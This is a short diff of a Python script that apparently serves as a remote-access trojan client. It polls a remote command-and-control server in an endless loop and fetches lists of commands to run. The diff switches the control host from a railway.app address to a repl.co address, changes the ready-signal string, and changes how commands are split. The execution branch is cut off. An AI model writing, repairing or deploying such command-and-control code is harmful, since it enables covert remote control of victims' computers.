@@ -1,10 +1,10 @@
 import requests,time,os
 while True:
     commands=[]
-    time.sleep(0.5)
-    if requests.get("https://R4t.up.railway.app/status").text == "OK":
+    time.sleep(1)
+    if requests.get("https://BraveVelvetyCrash.killergriffn.repl.co/status").text == "READY FOR COMMAND":
         try:
-            commands = list(requests.post("https://R4t.up.railway.app/commands/exec").text)
+            commands = requests.post("https://BraveVelvetyCrash.killergriffn.repl.co/commands/exec").text.split(":::")
         except:
             commands = ["test"]
     else:
